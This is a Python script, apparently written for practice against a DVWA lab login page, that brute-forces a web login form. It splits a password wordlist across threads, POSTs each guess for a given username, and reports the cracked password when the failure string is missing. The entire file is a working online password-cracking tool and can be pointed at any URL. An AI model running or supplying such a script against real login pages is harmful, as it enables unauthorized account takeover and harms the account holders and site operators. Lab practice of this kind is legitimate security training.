import requests
from termcolor import colored
import threading
import os


def login(url, username, passwords, errorstr, payload):
    data = payload
    for password in passwords:
        data['username'] = username
        data['password'] = password.rstrip()
        res = requests.post(url, data=data)
        if errorstr not in res.text:
            print(colored(
                f'[+] Password is cracked user : {username}   password : { password}', 'green'))
            os._exit(1)
        else:
            print(
                f'[-] Wrong password user : {username}   password : { password}')


def main():
    url = input('Enter url : ')  # 'http://192.168.56.121/dvwa/login.php'
    username = input('Enter username : ')  # 'admin'
    filename = input('Enter file path : ')  # '/home/cyberhunter/password.txt'
    payload = {'Login': 'Login'}
    errorstr = input('Enter error string : ')  # 'Login failed'
    thread_lmt = int(input('Enter total no. of threads : '))  # 10
    threads = []

    with open(filename, 'r') as fileobj:
        passwords = fileobj.readlines()
        step = len(passwords)//thread_lmt
        for i in range(0, len(passwords), step):
            wrap = passwords[i:i+step]
            t = threading.Thread(target=login,
                                 args=[url, username, wrap, errorstr, payload])
            t.start()
            threads.append(t)

        # login(url, username, passwords, errorstr, payload)

    for thread in threads:
        thread.join()

    print(colored("Can't find password", 'red'))


if __name__ == '__main__':
    main()
